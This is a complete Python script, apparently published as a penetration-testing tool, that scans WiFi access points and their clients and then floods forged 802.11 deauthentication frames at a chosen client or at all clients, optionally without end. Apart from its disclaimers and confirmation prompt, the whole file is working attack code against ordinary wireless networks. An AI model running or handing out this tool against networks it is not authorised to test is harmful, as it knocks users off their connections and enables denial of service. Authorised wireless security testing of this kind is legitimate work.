#!/usr/bin/env python3
"""
WiFi Deauth Tool — Educational / Authorised Penetration Testing Only
Author: itsrajadarsh
DISCLAIMER: Only use this on networks you own or have explicit written
            permission to test. Unauthorised use is illegal.
"""

import os
import sys
import time
import signal
import subprocess
import threading
from scapy.all import (
    sniff, sendp, RadioTap, Dot11, Dot11Beacon, Dot11Elt,
    Dot11EltDSSSet, Dot11Deauth
)

# ── Globals ────────────────────────────────────────────────────────────────────
found_aps: dict = {}
found_clients: set = set()
_stop_hopper = threading.Event()

# 2.4 GHz + most common 5 GHz channels (UNII-1/2/3)
CHANNELS_2G = [1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10]
CHANNELS_5G = [36, 40, 44, 48, 52, 56, 60, 64,
               100, 104, 108, 112, 116, 120, 124, 128,
               132, 136, 140, 149, 153, 157, 161, 165]
ALL_CHANNELS = CHANNELS_2G + CHANNELS_5G


# ── Helpers ────────────────────────────────────────────────────────────────────

def run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
    """Run a subprocess command, suppressing output by default."""
    kwargs.setdefault("stdout", subprocess.DEVNULL)
    kwargs.setdefault("stderr", subprocess.DEVNULL)
    return subprocess.run(cmd, **kwargs)


def kill_interfering_processes() -> None:
    """Kill processes known to fight over the wireless card (NetworkManager, wpa_supplicant)."""
    print("[*] Killing interfering processes (wpa_supplicant, NetworkManager)...")
    for proc in ("wpa_supplicant", "NetworkManager", "dhclient", "dhcpcd"):
        run(["sudo", "pkill", "-x", proc])
    time.sleep(1)


def restore_network_manager() -> None:
    """Restart NetworkManager so normal connectivity is restored on exit."""
    print("[*] Restarting NetworkManager...")
    run(["sudo", "systemctl", "start", "NetworkManager"])
    time.sleep(2)


def set_monitor_mode(iface: str) -> bool:
    """Put interface into monitor mode. Returns True on success."""
    print(f"[*] Switching {iface} to monitor mode...")
    run(["sudo", "ip", "link", "set", iface, "down"])
    result = run(["sudo", "iw", "dev", iface, "set", "type", "monitor"],
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    run(["sudo", "ip", "link", "set", iface, "up"])
    time.sleep(2)
    if result.returncode != 0:
        print(f"[!] iw returned non-zero ({result.returncode}). Trying iwconfig fallback...")
        run(["sudo", "iwconfig", iface, "mode", "monitor"])
        run(["sudo", "ip", "link", "set", iface, "up"])
        time.sleep(2)
    return True


def set_managed_mode(iface: str) -> None:
    """Return interface to managed mode."""
    print(f"[*] Switching {iface} to managed mode...")
    run(["sudo", "ip", "link", "set", iface, "down"])
    run(["sudo", "iw", "dev", iface, "set", "type", "managed"])
    run(["sudo", "ip", "link", "set", iface, "up"])
    time.sleep(1)


def set_channel(iface: str, channel: int, retries: int = 5) -> bool:
    """
    Attempt to lock the interface to a specific channel.
    Retries with back-off to handle 'Device or resource busy' (-16).
    Returns True if successful.
    """
    for attempt in range(1, retries + 1):
        result = subprocess.run(
            ["sudo", "iw", "dev", iface, "set", "channel", str(channel)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        if result.returncode == 0:
            return True
        stderr = result.stderr.decode(errors="ignore").strip()
        print(f"  [!] Channel set attempt {attempt}/{retries} failed: {stderr}")
        # Brief down/up cycle can release the lock
        run(["sudo", "ip", "link", "set", iface, "down"])
        time.sleep(0.5 * attempt)
        run(["sudo", "ip", "link", "set", iface, "up"])
        time.sleep(0.5 * attempt)
    print(f"  [-] Could not lock to channel {channel}. Packets may still be sent.")
    return False


# ── Channel Hopper ─────────────────────────────────────────────────────────────

def channel_hopper(iface: str) -> None:
    """Cycle through all channels while scanning."""
    _stop_hopper.clear()
    while not _stop_hopper.is_set():
        for ch in ALL_CHANNELS:
            if _stop_hopper.is_set():
                return
            run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)])
            time.sleep(0.3)


# ── Packet Callbacks ───────────────────────────────────────────────────────────

def _ap_callback(pkt) -> None:
    """Collect beacon frames → populate found_aps."""
    try:
        if not pkt.haslayer(Dot11Beacon):
            return
        bssid = pkt[Dot11].addr2
        if not bssid or bssid in found_aps:
            return

        raw_ssid = pkt[Dot11Elt].info
        ssid = raw_ssid.decode(errors="ignore").strip() or "Hidden"

        # Try DSS set tag first, then walk Dot11Elt tags for DS Param (ID=3)
        channel = None
        if pkt.haslayer(Dot11EltDSSSet):
            channel = pkt[Dot11EltDSSSet].channel
        else:
            elt = pkt[Dot11Elt]
            while isinstance(elt, Dot11Elt):
                if elt.ID == 3 and elt.info:
                    channel = elt.info[0]
                    break
                elt = elt.payload

        found_aps[bssid] = {"ssid": ssid, "channel": channel}
        ch_str = f"Ch: {channel}" if channel else "Ch: ?"
        print(f"  [AP Found] {bssid} - {ssid} ({ch_str})")
    except Exception:
        pass


def _client_callback(pkt, target_bssid: str) -> None:
    """Collect MACs communicating with the target AP."""
    try:
        if not pkt.haslayer(Dot11):
            return
        addrs = {pkt[Dot11].addr1, pkt[Dot11].addr2, pkt[Dot11].addr3}
        if target_bssid not in addrs:
            return
        for addr in [pkt[Dot11].addr1, pkt[Dot11].addr2]:
            if addr and addr not in (target_bssid, "ff:ff:ff:ff:ff:ff") \
                    and addr not in found_clients:
                found_clients.add(addr)
                print(f"  [Client Found] {addr}")
    except Exception:
        pass


# ── Input Helpers ──────────────────────────────────────────────────────────────

def prompt_int(prompt: str, default: int | None = None,
               min_val: int | None = None, max_val: int | None = None) -> int:
    """Prompt for an integer with optional default and range validation."""
    hint = f" [{default}]" if default is not None else ""
    while True:
        raw = input(f"{prompt}{hint}: ").strip()
        if raw == "" and default is not None:
            return default
        try:
            val = int(raw)
            if min_val is not None and val < min_val:
                print(f"  [!] Must be >= {min_val}")
                continue
            if max_val is not None and val > max_val:
                print(f"  [!] Must be <= {max_val}")
                continue
            return val
        except ValueError:
            print("  [!] Please enter a valid integer.")


def prompt_float(prompt: str, default: float) -> float:
    """Prompt for a float with a default fallback."""
    while True:
        raw = input(f"{prompt} [{default}]: ").strip()
        if raw == "":
            return default
        try:
            return float(raw)
        except ValueError:
            print("  [!] Please enter a valid number.")


# ── Main ───────────────────────────────────────────────────────────────────────

def main() -> None:
    global found_clients

    # ── Root check ────────────────────────────────────────────────────────────
    if os.getuid() != 0:
        print("[-] This script must be run as root (sudo).")
        sys.exit(1)

    print("=" * 55)
    print("  WiFi Deauth Tool — Authorised Pen-Testing Only")
    print("=" * 55)
    print("[!] DISCLAIMER: Only use on networks you own or have")
    print("    explicit written permission to test.\n")

    # ── Interface selection ───────────────────────────────────────────────────
    import netifaces
    interfaces = [i for i in netifaces.interfaces() if i != "lo"]
    print("--- Available Interfaces ---")
    for i, iface in enumerate(interfaces):
        print(f"  {i}) {iface}")

    iface_idx = prompt_int("\n[?] Select interface index", min_val=0, max_val=len(interfaces) - 1)
    selected_iface = interfaces[iface_idx]

    selected_iface_ref = selected_iface  # keep for finally block

    try:
        # ── Kill interfering daemons then enter monitor mode ──────────────────
        kill_interfering_processes()
        set_monitor_mode(selected_iface)

        # ── Phase 1: AP Scan ──────────────────────────────────────────────────
        scan_time = 20
        print(f"\n[*] Phase 1: Scanning for APs ({scan_time}s)...")
        print("    (Hopping all 2.4 GHz + 5 GHz channels)")

        hopper_thread = threading.Thread(
            target=channel_hopper, args=(selected_iface,), daemon=True
        )
        hopper_thread.start()

        try:
            sniff(iface=selected_iface, prn=_ap_callback,
                  timeout=scan_time, store=False)
        except OSError as e:
            # "Network is down" can fire when the hopper changes channels;
            # we just ignore it and continue with whatever we collected.
            print(f"  [~] Sniff ended early ({e}). Continuing with collected APs.")

        _stop_hopper.set()
        hopper_thread.join(timeout=3)

        if not found_aps:
            print("[-] No APs found. Try a longer scan or check your hardware.")
            return

        # ── AP selection ──────────────────────────────────────────────────────
        ap_list = list(found_aps.keys())
        print("\n--- Access Points ---")
        for i, bssid in enumerate(ap_list):
            info = found_aps[bssid]
            ch_str = info["channel"] if info["channel"] else "?"
            print(f"  {i}) {bssid}  |  {info['ssid']}  |  Ch {ch_str}")

        ap_idx = prompt_int("\n[?] Select AP index", min_val=0, max_val=len(ap_list) - 1)
        target_bssid = ap_list[ap_idx]
        target_info  = found_aps[target_bssid]
        target_ch    = target_info["channel"]

        print(f"\n[*] Target: {target_info['ssid']} ({target_bssid})")

        # ── Lock channel ──────────────────────────────────────────────────────
        if target_ch:
            print(f"[*] Locking {selected_iface} to channel {target_ch}...")
            success = set_channel(selected_iface, target_ch)
            if success:
                print(f"    ✓ Locked to channel {target_ch}")
        else:
            print("[!] Channel unknown — skipping channel lock.")

        # ── Phase 2: Client Scan ──────────────────────────────────────────────
        client_scan_time = 15
        found_clients = set()
        print(f"\n[*] Phase 2: Scanning for clients on '{target_info['ssid']}' ({client_scan_time}s)...")

        try:
            sniff(iface=selected_iface,
                  prn=lambda p: _client_callback(p, target_bssid),
                  timeout=client_scan_time, store=False)
        except OSError as e:
            print(f"  [~] Client sniff ended early ({e}).")

        # ── Client selection ──────────────────────────────────────────────────
        client_list = sorted(found_clients)
        print("\n--- Verified Clients ---")
        print("  0) BROADCAST (all clients — use with caution)")
        for i, mac in enumerate(client_list, start=1):
            print(f"  {i}) {mac}")

        c_idx = prompt_int(
            "\n[?] Select client index (0 = broadcast)",
            default=0, min_val=0, max_val=len(client_list)
        )
        target_client = "ff:ff:ff:ff:ff:ff" if c_idx == 0 else client_list[c_idx - 1]

        # ── Deauth parameters ─────────────────────────────────────────────────
        p_count = prompt_int(
            "[?] Packet count (0 = infinite loop)",
            default=100, min_val=0
        )
        p_inter = prompt_float("[?] Interval between packets (sec)", default=0.1)
        p_reason = prompt_int(
            "[?] Deauth reason code (1=unspec, 7=mismatch) [7]",
            default=7, min_val=1, max_val=23
        )

        # ── Confirm before sending ────────────────────────────────────────────
        print("\n[!] About to send deauth frames:")
        print(f"    AP      : {target_bssid} ({target_info['ssid']})")
        print(f"    Client  : {target_client}")
        print(f"    Count   : {'∞' if p_count == 0 else p_count}")
        print(f"    Interval: {p_inter}s")
        print(f"    Reason  : {p_reason}")
        confirm = input("\n[?] Proceed? (yes/no) [no]: ").strip().lower()
        if confirm not in ("yes", "y"):
            print("[-] Aborted.")
            return

        # ── Send deauth frames ────────────────────────────────────────────────
        print(f"\n[*] Launching Deauth attack... (Ctrl+C to stop)")
        pkt = (RadioTap() /
               Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid) /
               Dot11Deauth(reason=p_reason))

        send_kwargs = {
            "iface": selected_iface,
            "inter": p_inter,
            "verbose": True
        }
        if p_count > 0:
            send_kwargs["count"] = p_count
        else:
            send_kwargs["loop"] = 1

        sendp(pkt, **send_kwargs)

    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user.")
    except Exception as exc:
        print(f"\n[!] Unexpected error: {exc}")
        raise
    finally:
        _stop_hopper.set()
        set_managed_mode(selected_iface_ref)
        restore_network_manager()
        print("[*] Done. Interface restored.")


if __name__ == "__main__":
    main()